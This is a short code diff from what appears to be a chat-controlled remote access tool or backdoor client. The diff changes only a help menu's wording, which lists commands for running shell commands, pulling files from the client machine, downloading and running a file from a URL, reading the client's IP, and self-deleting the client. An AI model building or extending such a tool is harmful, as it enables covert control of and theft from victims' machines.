@@ -74,8 +74,8 @@ def handle_message(message):
         help_text = (
             "!cmd <commande> : run commands.\n"
             "!shell <commande> : run shell commands.\n"
-            "!upload <chemin_du_fichier> : download file (enter the file path).\n"
-            "!download <url_du_fichier> : download file from url and run it.\n"
+            "!upload <file_path> : download file (enter the file path).\n"
+            "!download <file_url> : download file from url and run it.\n"
             "!ip : get ip info of client.\n"
             "!kms : self delete client file.\n"
             "!check : check if the client is connected."
